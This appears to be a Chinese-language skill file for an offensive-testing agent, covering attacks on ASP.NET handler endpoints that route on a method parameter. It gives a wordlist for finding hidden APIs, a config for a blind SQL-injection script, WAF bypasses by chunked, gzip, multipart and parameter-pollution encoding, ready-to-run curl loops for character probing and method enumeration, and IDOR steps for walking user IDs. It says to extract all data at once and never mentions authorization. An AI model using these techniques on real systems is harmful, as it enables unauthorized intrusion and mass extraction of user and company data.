---
name: method-injection
description: >-
  ASP.NET Handler method参数路由接口全面测试 — method枚举发现隐藏API + 注入测试 + IDOR/BOLA + 报错回显
---

# method 参数注入（ASP.NET Handler）

> 适用场景：`manage.ashx` / `handler.ashx` / `command.ashx` 类 ASP.NET Handler
> 特征：method/m 参数做 switch/case 路由，不同 method 对应不同功能
> 不限于注入：method 枚举本身就是发现隐藏 API 的有效手段

---

## 架构识别

遇到 `?m=xxx` 或 `?method=xxx` 格式时，这是一个 **ASP.NET Handler 路由**：
```
单个 ashx 端点 → 通过 m/method 参数分派到不同处理函数
```

常见命名：
| 参数名 | 出现场景 |
|:-------|:---------|
| `m` | command.ashx?m=getbushulevel |
| `method` | Handler.ashx?method=checkadminaccount |
| `action` | 少数非标准实现 |

---

## Phase 0：Method 枚举发现隐藏 API（最重要）

**在考虑注入之前，先把 method 枚举一遍。** 同一个 ashx 下可能挂了多个功能，有的一不要参数就返回全部数据，有的遍历 userid 能提取全量用户。

```
核心思路：
  不同 method = 不同后端函数
  枚举 method → 发现未预期公开的 API
  比 SQL 注入更可能直接拿到数据
```

### 枚举字典

组合生成：基础词根 + 业务词根 + CRUD 词根

```python
# 常用 method 枚举字典
methods = [
    # 基础
    'getbushulevel', 'getbushulist', 'query', 'login', 'userinfo',
    'companylist', 'getcompanylist', 'getcorpname',
    # 数据
    'getdata', 'getlist', 'getall', 'getpage', 'getinfo',
    'getuser', 'getuserinfo', 'getrole', 'getroles',
    'getmenu', 'getmenulist', 'getrouters',
    'getconfig', 'getsetting', 'gettree',
    # 业务
    'checkadminaccount', 'checklogin', 'checkaccount',
    'getorg', 'getorganize', 'getdept', 'getdepartment',
    'getcorp', 'getcompany', 'getcompanyinfo',
    'getlevel', 'getbushu', 'bushulevel',
    'getcustomer', 'getuserlist',
    'getnotice', 'getnews', 'getarticle',
    'getcode', 'gettoken', 'getsession',
    # CRUD
    'search', 'find', 'load', 'getrecord',
    'save', 'update', 'delete', 'add',
    'export', 'import', 'download',
    # 认证
    'login', 'userlogin', 'adminlogin',
    'check', 'validate', 'verify', 'auth',
    # 常见变体
    'getallcompany', 'getcompanylist', 'companylist',
    'getbushulist', 'getbushulevel', 'bushulevel',
    'getdeptlist', 'deptlist', 'departmentlist',
]
```

### 产出分类

枚举结果按价值排序：

| 响应特征 | 价值 | 做法 |
|:---------|:-----|:-----|
| 直接返回JSON数据 | 🚨 P0 | 立刻提取全量数据 |
| SQL报错回显 | 🚨 P0 | 确认注入点存在 |
| "缺少参数[xxx]" | 🟡 P2 | 参数补齐后重试 |
| "解析Method失败" | ⚪ 无效 | 跳过 |
| "数据访问失败" | ⚪ 无效 | SQL异常被catch |

### 实战案例：command.ashx 枚举

```
method=userinfo&userid=9999         → 返回用户数据（IDOR）
method=companylist                  → 返回全量公司列表（无认证）
method=getbushulevel&company=xxx    → SQL报错回显（注入确认）
method=login&user=admin            → 登录接口（参数化查询）
method=query&Company=xxx           → 卡号查询（参数化查询）
```

---

## 判断流程

```
method=baseline&k=v   → 响应 "1"          ← 基准（登录失败）
method=baseline' XXX  → 响应 ""（空/200）  ← WAF 拦截
method=FAKE&k=v       → 响应 ""（空/200）  ← switch 无匹配
method=getqrcode      → 响应 "error"       ← 有效 method 但参数不全
```

---

## 工具脚本

```
skills/method-injection/method_injection.py
```

### 改 CONFIG 段即用

```python
TARGET          = "https://target.com/manage.ashx"
BASELINE_METHOD = "checkadminaccount"    # 合法 method 值
DB_TYPE         = "MSSQL"               # MSSQL | MySQL | PostgreSQL
DELAY_SEC       = 5
BYPASS_MODE     = "direct"              # direct | chunked | gzip | multipart | pollution | qs
SAMPLE_N        = 15
```

### 注入打法

| Phase | 内容 |
|-------|------|
| Phase 0 | **method 枚举发现隐藏 API**（先干这个） |
| Phase 1 | **基线采集** 20次 → median + stdev → 阈值 = median + 3σ |
| Phase 2 | **时间检测** WAITFOR/SLEEP/IF 各×10次 → diff+outlier 量化判定 |
| Phase 3 | **条件盲注提取** cond() → extract_char() 二分法 → extract_str() |

判定标准：
```
"!!"  ← median diff > 2s 且 outliers > 25%（确认注入）
"?"   ← median diff > 0.5s（可疑）
"-"   ← 无明显差异
```

### WAF 绕过策略

| bypass 值 | 说明 |
|-----------|------|
| `direct` | 标准 POST |
| `chunked` | Transfer-Encoding: chunked 分割关键字 |
| `gzip` | Content-Encoding: gzip 压缩绕过 |
| `multipart` | multipart/form-data boundary 分块 |
| `pollution` | 参数污染 `method=valid&method=sqli` |
| `qs` | method 放 QueryString，body 放其他参数 |

---

## 手工快速检测

```bash
# 1. WAF 拦截哪些字符
for c in "'" '"' ";" "--" "#" "(" ")" "%" "=" " " "+" "/" "*"; do
  resp=$(curl -sk -X POST "$TARGET" \
    -d "method=$BASELINE$c&k=v" \
    --connect-timeout 8 --max-time 12 2>/dev/null)
  [ -z "$resp" ] && echo "BLOCKED: $c" || echo "PASS: $c -> [$resp]"
done

# 2. method 枚举
while IFS= read -r m; do
  resp=$(curl -sk -X POST "$TARGET" \
    -d "method=$m&k=v" \
    --connect-timeout 8 --max-time 12 2>/dev/null)
  [ -n "$resp" ] && [ "$resp" != "1" ] && echo "method=$m -> [$resp]"
done < methods.txt
```

---

## IDOR 检查要点

method 路由的 API 特别容易出现 IDOR/BOLA，因为：

1. **参数名混用**：同一个 method 可能接受 `userid`/`id`/`uid`/`customerid` 多个参数名
2. **连续ID**：userid 用自增整数，无认证即可遍历
3. **响应差异**：有效 ID 返回数据 vs 无效 ID 返回"注册用户ID无效"，可作为 bool 盲遍历的信号

检查方法：
```
# 看响应差异识别有效ID标记
userid=1    → "注册用户ID无效"    ← 不存在
userid=9999 → {"UserID":"9999",...}  ← 存在

# 范围探测（二分法找边界）
userid=1 → false
userid=1000 → true
userid=200000 → true
```

---

## 常见 method 名前缀

| 领域 | 常见前缀 | 实战命中率 |
|:-----|:---------|:----------|
| 公司 | getcorp, getcompany, getorg, getbushu | ⭐⭐⭐⭐⭐ |
| 用户 | getuser, getcustomer, getmember | ⭐⭐⭐⭐⭐ |
| 数据 | getdata, getlist, getall, getpage | ⭐⭐⭐⭐ |
| 登录 | login, check, getcode, gettoken | ⭐⭐⭐ |
| 配置 | getconfig, getsetting, getparam | ⭐⭐ |

---

## 关联

- [sqli-sql-injection](../sqli-sql-injection/skill.md) — 通用 SQLi 技法
- [waf-bypass-techniques](../waf-bypass-techniques/skill.md) — 通用 WAF 绕过
- [idor-broken-object-authorization](../idor-broken-object-authorization/skill.md) — IDOR/BOLA 测试
